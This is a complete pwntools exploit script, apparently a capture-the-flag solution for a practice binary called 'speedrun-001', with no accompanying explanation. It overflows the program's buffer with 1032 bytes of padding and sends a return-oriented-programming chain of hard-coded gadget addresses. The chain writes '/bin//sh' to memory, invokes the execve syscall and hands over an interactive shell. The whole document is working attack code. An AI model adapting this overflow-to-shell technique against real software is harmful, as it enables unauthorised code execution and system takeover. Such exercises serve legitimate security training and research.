from pwn import *
target = process('./speedrun-001')

syscall = 0x000000000040129c  #syscall
popRax = 0x0000000000415664 # pop rax ; ret 
popRdi = 0x0000000000400686 
popRsi = 0x00000000004101f3 
popRdx = 0x000000000044be16  
mov = 0x000000000048d251 #  mov qword ptr [rax], rdx ; ret

padding = b"A"*1032

ROPchain = b""
ROPchain += p64(popRax)
ROPchain += p64(0x6b6030)
ROPchain += p64(popRdx)
ROPchain += b"/bin//sh" # /bin/sh\x00 also works
ROPchain += p64(mov)

ROPchain += p64(popRax)
ROPchain += p64(0x3b)

ROPchain += p64(popRdi)
ROPchain += p64(0x6b6030)

ROPchain += p64(popRsi)
ROPchain += p64(0x0)
ROPchain += p64(popRdx)
ROPchain += p64(0x0)

ROPchain += p64(syscall)

payload = padding+ROPchain

#print(len(payload))
target.sendline(payload)
target.interactive()
